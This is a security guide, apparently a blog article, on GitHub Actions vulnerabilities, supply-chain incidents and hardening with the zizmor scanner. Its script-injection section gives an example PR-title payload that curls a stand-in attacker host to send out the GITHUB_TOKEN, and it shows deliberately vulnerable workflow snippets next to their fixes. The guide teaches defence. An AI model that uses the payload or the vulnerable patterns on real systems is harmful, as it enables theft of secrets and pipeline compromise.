---
title: "GitHub Actions Security: Risks, Exploits, and Hardening"
description: "A comprehensive guide to GitHub Actions security vulnerabilities, common exploit patterns, and how to audit and harden your CI/CD pipelines using tools like zizmor."
date: 2026-04-02
categories: [Guides]
tags: [software-engineering, intermediate, security, devops, ci-cd, github-actions, supply-chain]
last_updated: 2026-05-30
---

CI/CD pipelines are not neutral infrastructure. They run with elevated privileges, hold production secrets, and execute arbitrary code on every push. When those pipelines are compromised, attackers get exactly what they want: write access to your codebase, your artifact registries, and your production environments. Understanding GitHub Actions security is not optional for any team shipping software in 2026.

## Why CI/CD Security Matters

Modern CI/CD pipelines accumulate privileges over time. A typical GitHub Actions workflow might hold AWS credentials for deployment, NPM tokens for publishing packages, signing keys for release artifacts, and access to production databases for migration steps. This privilege accumulation makes pipelines a high-value target.

The consequences of pipeline compromise are not theoretical. Three incidents shaped how the industry thinks about supply chain attacks through build systems:

**SolarWinds (2020):** Attackers compromised the Orion build system and injected malicious code into signed software updates distributed to 18,000 customers, including multiple US federal agencies. The build system was the attack vector precisely because it had legitimate signing authority.

**Codecov (2021):** An attacker modified Codecov's `bash` uploader script hosted on their infrastructure. Customers piping this script directly into `bash` in their CI pipelines exported their environment variables, including `GITHUB_TOKEN`, AWS credentials, and other secrets, to an attacker-controlled server. Thousands of organizations were affected, including Twilio, Hashicorp, and Rapid7 (CVE-2021-3639).

**ua-parser-js (2021):** The npm package `ua-parser-js` was hijacked after an attacker gained access to the maintainer's npm account. Malicious versions containing a cryptominer and credential-stealing code were published and briefly served to downstream consumers. Any CI pipeline that ran `npm install` in the affected window pulled the malicious code.

Each of these attacks succeeded because build systems are trusted by definition, they produce the artifacts that ship to users. GitHub Actions runs arbitrary code inside your infrastructure, and that code has the same trust level as your engineering team.

## Common GitHub Actions Vulnerabilities

### Script Injection via Untrusted Inputs

The most common critical vulnerability in GitHub Actions workflows is script injection. It occurs when attacker-controlled data flows into a `run:` block through an expression like `${{ github.event.pull_request.title }}`.

```yaml
# Vulnerable: PR title injected directly into shell command
- name: Post comment
  run: |
    gh issue comment ${{ github.event.number }} \
      --body "Running tests for: ${{ github.event.pull_request.title }}"
```

An attacker can open a PR with a title like `"; curl https://attacker.example/exfil?t=$GITHUB_TOKEN #` and execute arbitrary commands in your runner. The fix is to pass untrusted data through environment variables instead of inline expressions:

```yaml
# Safe: untrusted input passed as environment variable
- name: Post comment
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    gh issue comment "${{ github.event.number }}" --body "Running tests for: $PR_TITLE"
```

GitHub Security Lab has documented multiple cases of this vulnerability in widely-used open source projects, including in GitHub's own starter workflows.

### Excessive Permissions

GitHub Actions grants workflows a `GITHUB_TOKEN` scoped to the repository. By default (until recently), this token had `write` permissions on most scopes. GitHub changed the default to `read-all` in 2023, but many organizations still run older configurations or explicitly override to broad write permissions.

The principle of least privilege applies here: a workflow that only reads artifacts has no business with `contents: write` or `packages: write`. Permissions should be declared explicitly at the workflow level and narrowed further at the job level:

```yaml
permissions:
  contents: read  # workflow-level default

jobs:
  deploy:
    permissions:
      id-token: write   # for OIDC token exchange
      contents: read
```

### Unpinned Third-Party Actions

When you reference `uses: actions/checkout@v4`, you are trusting that the `v4` tag in the `actions/checkout` repository points to safe code. Tags are mutable. A compromised maintainer account or a supply chain attack can move a tag to point at malicious code, and every workflow using that tag will execute it on the next run.

Pinning to a full SHA hash prevents this:

```yaml
# Vulnerable: mutable tag reference
uses: actions/checkout@v4

# Safe: immutable SHA pin
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

The SHA corresponds to the specific commit you audited. It cannot be silently changed. Tools like Dependabot and Renovate can automate SHA pin updates when new versions are released.

### pull_request_target Misuse

`pull_request_target` was introduced to allow workflows to access repository secrets when triggered by pull requests from forks, a common need for things like posting test results. The trigger runs in the context of the base branch (your repo), not the fork, giving it access to secrets.

The critical mistake is combining `pull_request_target` with a checkout of the PR's head commit:

```yaml
# Critically vulnerable: runs fork code with repo secrets
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checking out fork code
      - run: npm test  # executing attacker-controlled code with SECRETS available
```

This is equivalent to executing untrusted code with your production credentials. GitHub itself issued a security advisory about this pattern (GHSA-fgv8-vgyp-7mq3). The safe approach is to split the workflow: run untrusted code in a `pull_request` event (no secrets), then trigger a separate `workflow_run` event with secrets to handle things like posting results.

### Secret Exfiltration on Public Repositories

Public repositories present a specific risk: anyone can open a pull request. Workflows that trigger on `pull_request` from forks do not have access to secrets by default, but misconfigurations can expose them. Even without secrets, attackers can exfiltrate build outputs, access internal hostnames visible from the runner network, or pivot to self-hosted runners if misconfigured.

### Artifact and Cache Poisoning

GitHub Actions caches (via `actions/cache`) are shared across branches within a repository. A cache entry written by a branch can be read by another branch, including `main`. If an attacker can control what goes into a cache, for example, by poisoning a dependency cache from a feature branch, they can cause the main branch build to use malicious cached artifacts.

Artifact poisoning follows a similar pattern: an attacker who can write to GitHub's artifact storage for a workflow run can potentially influence dependent workflows that consume those artifacts.

### Self-Hosted Runner Risks

GitHub-hosted runners are ephemeral: each job gets a fresh VM that is destroyed after the job completes. Self-hosted runners often are not. A self-hosted runner that persists between runs can accumulate state: cached credentials, modified toolchains, leftover files from previous jobs. An attacker who can execute code on a self-hosted runner (through any of the vulnerabilities above) can plant a backdoor that persists across future runs.

The 2023 PyTorch supply chain incident involved a self-hosted runner being compromised, allowing an attacker to exfiltrate PyTorch's binary artifacts before they were signed.

## zizmor: Static Analysis for GitHub Actions

zizmor is an open-source command-line tool that performs static analysis on GitHub Actions workflow files. It implements a set of security audits covering the most common vulnerability classes described above.

### Installation

```bash
# Via cargo (Rust toolchain)
cargo install zizmor

# Via pip
pip install zizmor

# Via Homebrew
brew install zizmor
```

### Basic Usage

Point zizmor at your `.github/workflows/` directory:

```bash
zizmor .github/workflows/
```

Output lists findings by severity with file paths and line numbers:

```
.github/workflows/ci.yml:42: [high] script-injection
  Potential script injection via github.event.pull_request.title

.github/workflows/release.yml:17: [medium] unpinned-uses
  Action 'actions/setup-node@v4' is not pinned to a SHA hash

.github/workflows/ci.yml:3: [low] excessive-permissions
  Workflow uses default token permissions; explicit permissions not set
```

### What zizmor Checks

zizmor's audits include:

- **`script-injection`**: Traces untrusted expression values (PR title, branch name, issue body, commit message) into `run:` blocks using taint analysis
- **`unpinned-uses`**: Detects action references using mutable tags or branch names instead of SHA pins
- **`excessive-permissions`**: Flags missing or overly broad `permissions` declarations
- **`dangerous-triggers`**: Warns about `pull_request_target` and `workflow_run` usage that could expose secrets
- **`unsecured-commands`**: Detects `ACTIONS_ALLOW_UNSECURE_COMMANDS=true`, which re-enables deprecated workflow commands that can be used for environment variable injection

### Integrating zizmor into CI

Run zizmor as a workflow itself to catch issues in PRs:

```yaml
name: Audit workflows

on:
  pull_request:
    paths:
      - '.github/workflows/**'

permissions:
  contents: read

jobs:
  zizmor:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      - uses: astral-sh/setup-uv@f0ec1fc3b38f5e7cd731bb6ce540c5af426746bb  # v5.4.0
        with:
          enable-cache: true
      - run: uvx zizmor .github/workflows/
```

This catches new vulnerability introductions before they merge. Full documentation is at [docs.zizmor.sh](https://docs.zizmor.sh/).

## Hardening Your GitHub Actions

### Pin All Actions to SHA Hashes

Every action reference should use a full 40-character SHA:

```yaml
# Before
uses: actions/checkout@v4

# After
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

Use a comment to document which tag the SHA corresponds to. Renovate and Dependabot both support automated SHA-pinned updates for Actions.

### Declare Minimum Required Permissions

Set `permissions: {}` at the workflow level to deny all by default, then grant only what each job needs:

```yaml
permissions: {}

jobs:
  test:
    permissions:
      contents: read
  publish:
    permissions:
      contents: read
      packages: write
      id-token: write
```

### Use Environments for Production Deploys

GitHub Environments add an approval gate before a job runs and scope secrets to specific environments:

```yaml
jobs:
  deploy:
    environment: production  # requires manual approval from designated reviewers
    steps:
      - run: ./deploy.sh
        env:
          DEPLOY_KEY: ${{ secrets.PRODUCTION_DEPLOY_KEY }}
```

This prevents a compromised workflow from reaching production credentials without human review.

### Protect Workflow Files with CODEOWNERS

Add a `CODEOWNERS` rule requiring senior engineers or a security team to review changes to workflow files:

```
# .github/CODEOWNERS
.github/workflows/ @your-org/platform-security
```

Combined with branch protection rules requiring CODEOWNERS approval, this creates a human review gate on all workflow changes.

### Audit Third-Party Actions Before Use

Before adding any third-party action, check:
- Is the action pinned in its own workflows?
- Does it request unnecessary permissions?
- Is the repository actively maintained?
- Has it been audited by OpenSSF or similar?

The [OpenSSF Scorecard](https://securityscorecards.dev/) provides an automated security posture score for open source projects, including checks for pinned dependencies, code review practices, and vulnerability disclosure processes.

### Separate Untrusted Code Execution from Privileged Steps

Structure workflows so untrusted code never runs in the same job as privileged operations:

```yaml
on:
  pull_request:  # no secrets available for fork PRs

jobs:
  test:
    # Run tests, no secrets needed, no problem
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - run: npm test

  # Post results as a separate workflow_run trigger (different workflow file)
  # that has access to secrets but does NOT check out PR code
```

## How This Applies to AI Systems

AI pipelines extend the CI/CD attack surface in ways that are not always obvious.

**Training data pipelines** often pull from external sources, S3 buckets, Hugging Face datasets, web scrapes. A compromised CI pipeline with access to these sources can poison training data or exfiltrate proprietary datasets. Training data is a sensitive artifact that deserves the same protection as source code.

**Model weights are deployment artifacts.** A build pipeline that trains and publishes model weights has the same risk profile as one that publishes software packages. Artifact signing and provenance (via SLSA or sigstore) apply to model weights as much as to binaries.

**Prompt template repositories** are increasingly managed as code. If a CI/CD pipeline renders or validates prompt templates, injecting malicious content via PR description (script injection) could cause the pipeline to emit tampered prompt templates to production.

**Cost amplification is a real risk.** A compromised pipeline in an AI organization can spin up GPU instances, trigger large training runs, or make thousands of expensive inference API calls. The blast radius of CI/CD compromise in an AI organization includes AWS bills in the tens of thousands of dollars, not just data exfiltration.

**API keys for model providers** (OpenAI, Anthropic, Google) are high-value targets. A key with high rate limits exfiltrated from CI can be used to run up costs against your account or to access any fine-tuned models you have deployed.

## References

- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [OWASP CI/CD Security Top 10](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [zizmor Documentation](https://docs.zizmor.sh/)
- [OpenSSF Scorecard](https://securityscorecards.dev/)
- [SLSA Supply Chain Levels for Software Artifacts](https://slsa.dev/)
- [GitHub Docs: Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [Codecov Security Advisory CVE-2021-3639](https://about.codecov.io/apr-2021-post-mortem/)
